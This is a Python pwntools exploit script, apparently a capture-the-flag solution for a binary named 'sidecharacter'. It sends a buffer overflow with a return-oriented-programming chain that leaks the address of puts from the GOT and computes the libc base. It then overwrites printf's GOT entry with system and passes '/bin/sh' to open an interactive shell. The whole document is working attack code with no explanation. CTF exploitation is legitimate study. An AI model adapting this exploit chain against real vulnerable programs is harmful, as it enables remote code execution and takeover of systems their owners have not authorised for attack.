#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './binary_patched')
# lib = CDLL(exe.libc.path)
host = args.HOST or 'sidecharacter.chall.srdnlen.it'
port = int(args.PORT or 443)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def vers_libc(function):
    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x401323
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

rdi = 0x40132c
gets = 0x401104
execute = 0x1337000
dati =  0x404040
puts = 0x4010b4
gotPuts = 0x404000
gotGets = 0x404028
gotPrintf = 0x404018
printf = 0x4010e4
main = 0x4007c7
bss = exe.bss(0x50)

padding = b"A" * 56

payload = flat(padding , p64(rdi) , gotPuts , p64(puts),
               p64(rdi), gotPrintf, p64(gets),
               p64(rdi), dati, p64(gets),
               p64(rdi), dati, p64(printf))

# print(len(shell))
io.sendlineafter(b"> ", payload)
print(io.recvline())
leakPuts = unpack(io.recvline().strip())
# print(type(leakPuts))
log.info(f"{leakPuts = :x}")

libc = ELF('../libc.so.6')
libc.address = leakPuts - libc.sym["puts"]

# addrBinSh = leakPuts -  + binsh
addrSystem = libc.sym["system"]
payload = p64(addrSystem)
io.sendline(payload)
io.sendline(b"/bin/sh\x00")

io.interactive()

